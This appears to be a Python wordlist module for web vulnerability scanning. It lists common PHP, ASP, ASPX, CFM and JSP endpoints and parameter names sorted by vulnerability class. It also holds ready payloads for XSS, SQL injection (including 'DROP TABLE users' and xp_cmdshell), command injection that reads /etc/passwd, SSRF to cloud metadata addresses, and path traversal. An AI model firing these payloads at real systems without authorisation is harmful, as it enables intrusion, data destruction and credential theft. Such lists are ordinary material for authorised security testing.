#!/usr/bin/env python3
"""
Enhanced Wordlists - Comprehensive endpoint and parameter lists for robust testing
"""

# PHP Endpoints
PHP_ENDPOINTS = [
    "index.php?search=",
    "login.php?redirect=",
    "profile.php?username=",
    "comment.php?message=",
    "product.php?name=",
    "cart.php?item=",
    "faq.php?question=",
    "feedback.php?content=",
    "contact.php?subject=",
    "subscribe.php?email=",
    "news.php?title=",
    "blog.php?post=",
    "forum.php?reply=",
    "review.php?comment=",
    "share.php?url=",
    "admin.php?action=",
    "dashboard.php?view=",
    "upload.php?file=",
    "download.php?path=",
    "search.php?q=",
    "gallery.php?image=",
    "category.php?id=",
    "user.php?id=",
    "edit.php?id=",
    "delete.php?id=",
    "api.php?endpoint=",
    "config.php?setting=",
    "backup.php?file=",
    "export.php?data=",
    "import.php?source=",
    "report.php?type="
]

# ASP Endpoints
ASP_ENDPOINTS = [
    "default.asp?search=",
    "login.asp?redirect=",
    "profile.asp?username=",
    "comment.asp?message=",
    "product.asp?name=",
    "cart.asp?item=",
    "faq.asp?question=",
    "feedback.asp?content=",
    "contact.asp?subject=",
    "subscribe.asp?email=",
    "news.asp?title=",
    "blog.asp?post=",
    "forum.asp?reply=",
    "review.asp?comment=",
    "share.asp?url=",
    "admin.asp?action=",
    "dashboard.asp?view=",
    "upload.asp?file=",
    "download.asp?path=",
    "search.asp?q=",
    "gallery.asp?image=",
    "category.asp?id=",
    "user.asp?id=",
    "edit.asp?id=",
    "delete.asp?id=",
    "api.asp?endpoint=",
    "config.asp?setting=",
    "backup.asp?file=",
    "export.asp?data=",
    "import.asp?source=",
    "report.asp?type="
]

# ASPX Endpoints
ASPX_ENDPOINTS = [
    "default.aspx?search=",
    "login.aspx?redirect=",
    "profile.aspx?username=",
    "comment.aspx?message=",
    "product.aspx?name=",
    "cart.aspx?item=",
    "faq.aspx?question=",
    "feedback.aspx?content=",
    "contact.aspx?subject=",
    "subscribe.aspx?email=",
    "news.aspx?title=",
    "blog.aspx?post=",
    "forum.aspx?reply=",
    "review.aspx?comment=",
    "share.aspx?url=",
    "admin.aspx?action=",
    "dashboard.aspx?view=",
    "upload.aspx?file=",
    "download.aspx?path=",
    "search.aspx?q=",
    "gallery.aspx?image=",
    "category.aspx?id=",
    "user.aspx?id=",
    "edit.aspx?id=",
    "delete.aspx?id=",
    "api.aspx?endpoint=",
    "config.aspx?setting=",
    "backup.aspx?file=",
    "export.aspx?data=",
    "import.aspx?source=",
    "report.aspx?type="
]

# CFM Endpoints
CFM_ENDPOINTS = [
    "index.cfm?search=",
    "login.cfm?redirect=",
    "profile.cfm?username=",
    "comment.cfm?message=",
    "product.cfm?name=",
    "cart.cfm?item=",
    "faq.cfm?question=",
    "feedback.cfm?content=",
    "contact.cfm?subject=",
    "subscribe.cfm?email=",
    "news.cfm?title=",
    "blog.cfm?post=",
    "forum.cfm?reply=",
    "review.cfm?comment=",
    "share.cfm?url=",
    "admin.cfm?action=",
    "dashboard.cfm?view=",
    "upload.cfm?file=",
    "download.cfm?path=",
    "search.cfm?q=",
    "gallery.cfm?image=",
    "category.cfm?id=",
    "user.cfm?id=",
    "edit.cfm?id=",
    "delete.cfm?id=",
    "api.cfm?endpoint=",
    "config.cfm?setting=",
    "backup.cfm?file=",
    "export.cfm?data=",
    "import.cfm?source=",
    "report.cfm?type="
]

# JSP Endpoints
JSP_ENDPOINTS = [
    "index.jsp?search=",
    "login.jsp?redirect=",
    "profile.jsp?username=",
    "comment.jsp?message=",
    "product.jsp?name=",
    "cart.jsp?item=",
    "faq.jsp?question=",
    "feedback.jsp?content=",
    "contact.jsp?subject=",
    "subscribe.jsp?email=",
    "news.jsp?title=",
    "blog.jsp?post=",
    "forum.jsp?reply=",
    "review.jsp?comment=",
    "share.jsp?url=",
    "admin.jsp?action=",
    "dashboard.jsp?view=",
    "upload.jsp?file=",
    "download.jsp?path=",
    "search.jsp?q=",
    "gallery.jsp?image=",
    "category.jsp?id=",
    "user.jsp?id=",
    "edit.jsp?id=",
    "delete.jsp?id=",
    "api.jsp?endpoint=",
    "config.jsp?setting=",
    "backup.jsp?file=",
    "export.jsp?data=",
    "import.jsp?source=",
    "report.jsp?type="
]

# High-Risk XSS Parameters
XSS_PARAMETERS = [
    "search", "q", "s", "query", "msg", "message", "comment", "post", "title", "subject",
    "redirect", "next", "return", "file", "path", "url", "dest", "link", "page",
    "input", "email", "name", "user", "term", "keyword", "callback", "content",
    "text", "data", "value", "param", "arg", "var", "field", "item", "id",
    "username", "password", "token", "session", "cookie", "header", "body",
    "json", "xml", "html", "css", "js", "script", "code", "exec", "cmd",
    "action", "method", "function", "class", "object", "array", "string",
    "number", "boolean", "null", "undefined", "error", "exception", "debug",
    "log", "trace", "info", "warn", "alert", "confirm", "prompt", "eval"
]

# SQL Injection Parameters
SQLI_PARAMETERS = [
    "id", "user_id", "product_id", "category_id", "order_id", "invoice_id",
    "username", "email", "password", "search", "query", "filter", "sort",
    "limit", "offset", "page", "size", "count", "total", "sum", "avg",
    "min", "max", "group", "having", "where", "select", "from", "join",
    "union", "order", "by", "asc", "desc", "like", "in", "not", "and", "or"
]

# LFI/RFI Parameters
LFI_PARAMETERS = [
    "file", "path", "page", "include", "require", "load", "read", "open",
    "view", "show", "display", "get", "fetch", "download", "upload",
    "import", "export", "backup", "restore", "config", "settings",
    "template", "theme", "skin", "layout", "style", "css", "js", "img"
]

# Command Injection Parameters
CMD_PARAMETERS = [
    "cmd", "command", "exec", "execute", "run", "system", "shell", "bash",
    "sh", "powershell", "ps", "ping", "nslookup", "dig", "curl", "wget",
    "nc", "netcat", "telnet", "ssh", "ftp", "scp", "rsync", "tar", "zip"
]

# SSRF Parameters
SSRF_PARAMETERS = [
    "url", "uri", "link", "href", "src", "target", "destination", "endpoint",
    "api", "webhook", "callback", "redirect", "proxy", "fetch", "get",
    "post", "put", "delete", "patch", "head", "options", "connect", "trace"
]

# XXE Parameters
XXE_PARAMETERS = [
    "xml", "data", "content", "body", "payload", "input", "file", "upload",
    "import", "export", "config", "settings", "template", "schema", "dtd"
]

# IDOR Parameters
IDOR_PARAMETERS = [
    "id", "user_id", "account_id", "profile_id", "document_id", "file_id",
    "order_id", "invoice_id", "ticket_id", "message_id", "post_id", "comment_id",
    "session_id", "token", "key", "hash", "uuid", "guid", "reference", "ref"
]

# Directory Traversal Payloads
DIRECTORY_TRAVERSAL_PAYLOADS = [
    "../", "..\\", "....//", "....\\\\", "%2e%2e%2f", "%2e%2e%5c",
    "%252e%252e%252f", "%252e%252e%255c", "..%2f", "..%5c", "..%252f", "..%255c",
    "%c0%ae%c0%ae%c0%af", "%c1%9c", "..%c0%af", "..%c1%9c"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>"
]

# SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 'x'='x",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR (1=1)--",
    "1' OR '1'='1",
    "1 OR 1=1",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT 1,2,3--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1'; DROP TABLE users--",
    "1'; EXEC xp_cmdshell('dir')--"
]

# Command Injection Payloads
CMD_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "; dir",
    "| dir",
    "& dir",
    "&& dir",
    "|| dir",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "`ls`",
    "$(ls)",
    "${ls}",
    "; whoami",
    "| whoami",
    "; id",
    "| id"
]

# SSRF Payloads
SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254",
    "http://metadata.google.internal",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "gopher://127.0.0.1:80",
    "dict://127.0.0.1:11211",
    "ftp://127.0.0.1",
    "ldap://127.0.0.1"
]

def get_php_endpoints():
    """Get PHP endpoints"""
    return PHP_ENDPOINTS.copy()

def get_asp_endpoints():
    """Get ASP endpoints"""
    return ASP_ENDPOINTS.copy()

def get_aspx_endpoints():
    """Get ASPX endpoints"""
    return ASPX_ENDPOINTS.copy()

def get_cfm_endpoints():
    """Get ColdFusion endpoints"""
    return CFM_ENDPOINTS.copy()

def get_jsp_endpoints():
    """Get JSP endpoints"""
    return JSP_ENDPOINTS.copy()

def get_xss_parameters():
    """Get XSS testing parameters"""
    return XSS_PARAMETERS.copy()

def get_all_endpoints():
    """Get all endpoints combined"""
    return PHP_ENDPOINTS + ASP_ENDPOINTS + ASPX_ENDPOINTS + CFM_ENDPOINTS + JSP_ENDPOINTS

def get_all_parameters():
    """Get all parameters combined"""
    return list(set(XSS_PARAMETERS + SQLI_PARAMETERS + LFI_PARAMETERS + 
                   CMD_PARAMETERS + SSRF_PARAMETERS + XXE_PARAMETERS + IDOR_PARAMETERS))

def get_all_payloads():
    """Get all payloads combined"""
    return {
        'xss': XSS_PAYLOADS,
        'sqli': SQLI_PAYLOADS,
        'cmd': CMD_PAYLOADS,
        'ssrf': SSRF_PAYLOADS,
        'lfi': DIRECTORY_TRAVERSAL_PAYLOADS
    }

def save_wordlists_to_files():
    """Save all wordlists to separate files"""
    import os
    
    wordlists_dir = "wordlists"
    if not os.path.exists(wordlists_dir):
        os.makedirs(wordlists_dir)
    
    # Save endpoints
    with open(f"{wordlists_dir}/php_endpoints.txt", "w") as f:
        f.write("\n".join(PHP_ENDPOINTS))
    
    with open(f"{wordlists_dir}/asp_endpoints.txt", "w") as f:
        f.write("\n".join(ASP_ENDPOINTS))
    
    with open(f"{wordlists_dir}/aspx_endpoints.txt", "w") as f:
        f.write("\n".join(ASPX_ENDPOINTS))
    
    with open(f"{wordlists_dir}/cfm_endpoints.txt", "w") as f:
        f.write("\n".join(CFM_ENDPOINTS))
    
    with open(f"{wordlists_dir}/jsp_endpoints.txt", "w") as f:
        f.write("\n".join(JSP_ENDPOINTS))
    
    with open(f"{wordlists_dir}/all_endpoints.txt", "w") as f:
        f.write("\n".join(get_all_endpoints()))
    
    # Save parameters
    with open(f"{wordlists_dir}/xss_parameters.txt", "w") as f:
        f.write("\n".join(XSS_PARAMETERS))
    
    with open(f"{wordlists_dir}/sqli_parameters.txt", "w") as f:
        f.write("\n".join(SQLI_PARAMETERS))
    
    with open(f"{wordlists_dir}/lfi_parameters.txt", "w") as f:
        f.write("\n".join(LFI_PARAMETERS))
    
    with open(f"{wordlists_dir}/cmd_parameters.txt", "w") as f:
        f.write("\n".join(CMD_PARAMETERS))
    
    with open(f"{wordlists_dir}/ssrf_parameters.txt", "w") as f:
        f.write("\n".join(SSRF_PARAMETERS))
    
    with open(f"{wordlists_dir}/all_parameters.txt", "w") as f:
        f.write("\n".join(get_all_parameters()))
    
    # Save payloads
    payloads = get_all_payloads()
    for payload_type, payload_list in payloads.items():
        with open(f"{wordlists_dir}/{payload_type}_payloads.txt", "w") as f:
            f.write("\n".join(payload_list))
    
    print(f"✅ All wordlists saved to {wordlists_dir}/ directory")

if __name__ == "__main__":
    save_wordlists_to_files()